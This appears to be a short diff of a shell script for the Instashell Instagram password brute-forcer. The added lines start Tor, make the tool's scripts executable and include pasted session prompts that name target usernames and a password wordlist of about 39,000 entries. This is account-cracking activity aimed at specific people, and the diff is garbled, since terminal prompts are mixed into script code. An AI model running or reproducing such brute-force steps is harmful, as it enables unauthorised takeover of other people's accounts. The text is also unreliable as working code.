@@ -213,4 +213,12 @@ case "$1" in --resume) resume ;; *)
 start
 bruteforcer
 esac
-
+service tor start
+cd instashell/
+chmod 775 instashell.sh
+chmod 775 install.sh
+user name: blogshaking
+password list (enter to default list): password.lst
+threads (use  , 20, default 10):
+username: mwilliams_wcg
+wordlist: passwords.lst (39330)
